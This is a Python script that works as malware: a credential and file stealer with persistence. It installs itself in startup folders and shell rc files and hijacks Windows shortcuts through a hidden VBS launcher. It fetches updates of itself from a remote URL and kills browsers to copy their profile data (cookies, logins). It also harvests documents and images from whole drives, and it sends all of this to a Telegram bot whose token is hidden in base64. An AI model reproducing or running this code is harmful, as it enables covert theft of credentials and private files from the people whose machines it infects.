import os
import sys
import shutil
import socket
from multiprocessing import Pool,Process,Queue,Lock
import multiprocessing
import requests
import base64
import time
import glob
import logging
import sys, win32com.client
                    
if os.name=='nt':
    try:
        import winshell
    except ImportError:
        logging.debug('Для вінди pip install winshell')

PROC_NUM=15
file_list=[]
sep='/'
chtid=wt=0
links_list=[]
def get_links(directory_path,extlist=[]):
    global links_list
    
    hostname=socket.gethostname()
    for root, dirs, files in os.walk(directory_path):
        for name in files:
            fname=os.path.join(root, name)
            if any([ele for  ele in extlist if fname.endswith("."+ele)]):
                splittup=os.path.splitext(fname)
                ext=splittup[1]
                if ext=='':
                    ext='default'
                if not fname.startswith('/media') and not hostname in fname:
                    links_list.append((fname,ext[1:]))
def copyFile(src,dst):
    try:
        shutil.copy(src,dst)
    except shutil.Error as e:
        logging.debug('Error: %s' % e)
    except IOError as e:
        logging.debug('Error: %s' % e.strerror)

def autoupdate():
    fname=sys.argv[0]
    Fname=os.path.split(fname)[1]
    print('Try to update from the github!!!')
    r=requests.get('https://raw.githubusercontent.com/hendalf332/tratata/master/getfls.py')
    if r.status_code==200:
        with open('update.txt','w',encoding='utf-8') as fl:
            fl.write(r.text)
        print('[+]Successful update')
        copyFile('update.txt',fname)
        os.remove('update.txt')
    else:
        logging.info('[-]Cant update')
        
def check_intr():
    try:
        requests.get("https://github.com")
        return 1
    except Exception:
        return -1
 
def waitForConnection():
    while True:
        if check_intr()<0:
            print('[-]No connection')
            time.sleep(10)
        else:
            break
 

def get_files(directory_path,extlist):
    global file_list
    hostname=socket.gethostname()
    for root, dirs, files in os.walk(directory_path):
        for name in files:
            fname=os.path.join(root, name)
            if any([ele for  ele in extlist if fname.endswith("."+ele)]):
                splittup=os.path.splitext(fname)
                ext=splittup[1]
                if ext=='':
                    ext='default'
                if not fname.startswith('/media') and not hostname in fname:
                    file_list.append((fname,ext[1:]))

def winntAutoRun():
    fname=sys.argv[0]
    Fname=fname.split('\\')[-1]
    appdata = os.environ['APPDATA']
    newScripFName=appdata+'\\'+Fname
    copyFile(fname,newScripFName)    
    fname=newScripFName
#######
    global links_list
    shell = win32com.client.Dispatch("WScript.Shell")
    srUpFolder=shell.SpecialFolders.Item("StartUp")
    get_links(srUpFolder,['lnk'])
    sFlag=False
    infFlag=False
    autoRunItems=shell.RegRead('HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\Run\\')
    print(f'{autoRunItems=}')
    for aitem in autoRunItems:
        print(aitem)
    for link in links_list:
        mylink=shell.CreateShortcut(link[0])
        target=mylink.TargetPath
        if fname in target:
            sFlag=True
            print('Вже заражено ярлик')
            return
    if sFlag==False:
        if not os.path.exists(f"{os.environ['TMP']}\\oldlinks\\"):
            os.mkdir(f"{os.environ['TMP']}\\oldlinks\\")
            print("Створили папку для ярликів")
            
        for link in links_list:
            mylink=shell.CreateShortcut(link[0])
            target=mylink.TargetPath
            extension=os.path.splitext(target)[1][1:]
            wd=mylink.WorkingDirectory
            oldlink=f"{os.environ['TMP']}\\oldlinks\\{os.path.split(link[0])[1]}"
            if fname not in target:
                
                copyFile(link[0],oldlink)
                bat=f'{fname}.vbs'
                os.system("attrib -h -s %s" %bat)
                script=f"""with CreateObject("WScript.Shell")
                .Run \"\"\"{oldlink}\"\"\"
                .Run "{fname}"
                end with
                """
                with open(f'{fname}.vbs','w') as bat:
                    bat.write(script)
                bat=f'{fname}.vbs'
                os.system("attrib +h +s %s" %bat)
                print(f'Пробую заразити ярлик {link[0]}')
                ico=mylink.IconLocation
                print(link[0],' ',mylink.TargetPath)
                newtarget='cmd.exe /c start "'+fname+'" && '+target
                if ".exe" in target:
                    mylink.IconLocation=target + ",0"
                else:
                    mylink.IconLocation=ico
                    if "." in target:
                        regKey='HKEY_CLASSES_ROOT\\'+extension.upper()+'File\\DefaultIcon\\'
                        ico=shell.RegRead(regKey)
                        mylink.IconLocation=ico
                    else:
                        mylink.IconLocation=shell.ExpandEnvironmentStrings("%windir%")&"\system32\shell32.dll,4"
                print(f"{newtarget=}")
                mylink.TargetPath=bat
                mylink.WorkingDirectory=wd
                mylink.WindowStyle=7
                try:
                    mylink.save()
                    infFlag=True
                    return
                except:
                    print('Не вдалося заразити файл')
                break



#########    
    fname=sys.argv[0]
    Fname=fname.split('\\')[-1]
    startup = winshell.startup()
    newScripFName=startup+'\\'+Fname
    copyFile(fname,newScripFName)
    return


def addToAutoRun():
    global sep
    shell=os.environ['SHELL']
    home=os.environ['HOME']
    scrptName=sys.argv[0]
    sep='/'
    if os.name=='nt':
        sep='\\'
        newScripFName=home+sep+scrptName
    else:
        newScripFName=home+sep+".config"+sep+scrptName
    copyFile(scrptName,newScripFName)
    copyFile("config.py",home+sep+".config"+sep+"config.py")
    shell=shell[shell[::-1].index(sep)*(-1):]
    if os.name=='nt':
        shell=shell[:shell.index('.')]
    if any([ele for ele in ["bash","zsh","csh","ksh","tcsh"] if (ele==shell) ]):
        pass
    else:
        print('[-]Shell doesn\'t exist')
        return 
    if os.name=='nt':
        autoconf=f"{home}{sep}.{shell}rc"
    else:
        autoconf=f"{home}{sep}.{shell}rc"
    autoflg=False
    logging.debug(autoconf)
    sptnm=os.path.split(scrptName)[1]
    if os.path.exists(autoconf):
        with open(autoconf,'r+') as shellrc:
            lines=shellrc.readlines()
            for line in lines:
                if f"{sptnm}" in line:
                    autoflg=True
    if autoflg==True:
        logging.info('!!!Файл вже додано для автозапуску!!!')
    else:
        logging.info('Зараз додаємо файл в автозапуск')
        try:
            with open(autoconf,'a',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\n(python3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &)")
        except FileNotFoundError:
            with open(autoconf,'x',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\n(python3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &)")            
    return

def send_document(bot_token,chtid,docfile,caption='Nothing'):
    url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
    data = {'chat_id' : chtid,'caption': caption}
    files={'document': open(docfile, 'rb')}
    r=requests.post(url,params=data,files=files)
    return


def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
    cnt=num
    PROC_NUM=15
    global sep
    if os.name=='nt':
        sep='\\'
    logging.info(f'Proc number {num} activated')
    while True:
        while len(fileList)>=num:
            if fileList[cnt]=='TERMINATED':
                return
            try:
                fname,dname=fileList[cnt]
                dirname=f"{hostdir}{sep}{dname}"
                if not os.path.exists(dirname):
                    os.mkdir(dirname)
                logging.info(f'Proc {num}:',fname)
                newname=fname[len(fname)-fname[::-1].index(sep)-1:]
                if not any([ele for ele in ["opera","firefox","chrome","chromium","safari"] if (ele in dirname) ]):
                    newname=fname.replace(':\\','.')
                    newname=newname.replace(sep,'.')
                copyFile(fname,f"{dirname}{sep}{newname}")
                fname=fname.replace('\\\\','\\')
            except:
                pass
            try:
                fname,dname=fileList[cnt]          
                send_document(wt,cht,fname,f"Folder:{dname} Host:{hostname} Origname:{os.path.split(fname)[1]} {fname}")
            except:
                pass
            try:
                if os.path.exists(fileList[cnt][0]):
                    cnt+=PROC_NUM
            except:
                pass

def main():
    global PROC_NUM
    global sep
    global file_list
    global cht
    global wt
    logging.basicConfig(format=u'%(filename)s [LINE:%(lineno)d] #%(levelname)-8s [%(asctime)s]  %(message)s',
                    level=logging.INFO,
                    )
###########
    linuxSuperFilesLst=[]
    if os.name!='nt':
        addToAutoRun()
    else:
        sep='\\'
        winntAutoRun()
    
    waitForConnection()
    if not sys.argv[0].endswith(".exe"):
	autoupdate()
    chtid=wt=0

    basestr=""#Here must be bot TOKEN and ChatID encoded in base64
    dstr=base64.b64decode(basestr)
    mystr=dstr.decode('ascii')
    keys=mystr.split('\n')
    cnt=0
    for el in keys:
        if '=' in el:
            ky,vl=el.split('=')
            if cnt==0:
                wt=vl[1:-1]
            else:
                cht=vl
            cnt+=1
############



    
    # mode
    mode = 0o666
    hostname=socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    hostdir=f".{sep}{hostname}-files"
    operdir=f".{sep}{hostname}-files{sep}opera"
    firefoxdir=f".{sep}{hostname}-files{sep}firefox"
    chromedir=f".{sep}{hostname}-files{sep}chrome"
    chromiumdir=f".{sep}{hostname}-files{sep}chromium"
    
    dirlist=[hostdir,operdir,firefoxdir,chromedir,chromiumdir]
    for dir in dirlist:
        if not os.path.exists(dir):
            try:
                logging.info(f'!!!Create directory {dir}')#Creating directory for files from victim computer
                os.mkdir(dir)      
            except :
                logging.info('No Permission')
            
    #extlist=['ini','inf','reg','sh','pl','py','sql']# here you type file extensions you want save on your USB device
    extlist=['jpg','jpeg','gif','doc','docx','pdf']
    multiprocessing.freeze_support()
    with multiprocessing.Manager() as manager:
        file_list=manager.list()
        procs=[]
        for num in range(1,PROC_NUM+1):
            procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname}-{ip_address}",wt,cht)))
        for proc in procs:
            proc.start()

        if os.name!= 'nt':
            directory_path='/'
            os.system('pkill -9 firefox')
            for file in glob.glob(os.environ['HOME']+"/.mozilla/firefox/*.default-*/*"):
                file_list.append((file,'firefox'))
            
            os.system('pkill -9 opera')
            for file in glob.glob(os.environ['HOME']+"/.opera*/*"):
                file_list.append((file,'opera'))

            os.system('pkill -9 chromium')
            for file in glob.glob(os.environ['HOME']+"/.config/chromium/*"):
                file_list.append((file,'chromium'))
                
            os.system('pkill -9 chrome')
            for file in glob.glob(os.environ['HOME']+"/.config/chrome/*"):
                file_list.append((file,'chrome'))

            for file in glob.glob(os.environ['HOME']+"/.config/opera/*"):
                file_list.append((file,'opera'))


        else:
            #os.system('taskkill /F /IM chrome.exe')
            for file in glob.glob(os.environ['APPDATA']+"\..\\Local\\Google\\Chrome\\User Data\\Default\\*"):
                file_list.append((file,'chrome'))
              
            #os.system('taskkill /F /IM opera.exe')
            for file in glob.glob(os.environ['APPDATA']+"\\Opera Software\\Opera Stable\\*"): 
                if os.path.split(file)[1][0].isupper():
                    file_list.append((file,'opera'))
        
            #os.system('taskkill /F /IM firefox.exe')
            for file in glob.glob(os.environ['APPDATA']+"\\Mozilla\\Firefox\\Profiles\\*.default-release\\*"):
                file_list.append((file,'firefox'))
    
            directory_path=r'D:\\'
        get_files(directory_path,extlist) 
        if os.name=='nt':
            directory_path=r'C:\\'
            get_files(directory_path,extlist)
            
        for num in range(1,PROC_NUM+1):
            file_list.append('TERMINATED')
            
        for proc in procs:
            proc.join() 
if __name__ == '__main__':
	main()
